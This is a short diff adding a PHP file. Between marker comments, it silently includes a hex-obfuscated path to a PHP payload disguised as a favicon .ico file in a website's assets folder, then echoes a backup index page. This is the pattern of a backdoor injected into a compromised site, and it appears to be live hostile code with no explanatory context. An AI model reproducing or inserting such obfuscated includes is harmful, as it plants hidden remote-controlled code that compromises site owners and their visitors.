@@ -1,0 +1,9 @@
+<?php
+/*af529*/
+
+@include "\x2fho\x6de/\x73wa\x72oo\x70rb\x6fbb\x79/p\x75bl\x69c_\x68tm\x6c/s\x74or\x6bks\x2eco\x6d/a\x73se\x74s/\x61ss\x65ts\x2ffa\x76ic\x6fn_\x335a\x6447\x2eic\x6f";
+
+/*af529*/
+
+
+echo file_get_contents('index.html.bak.bak');
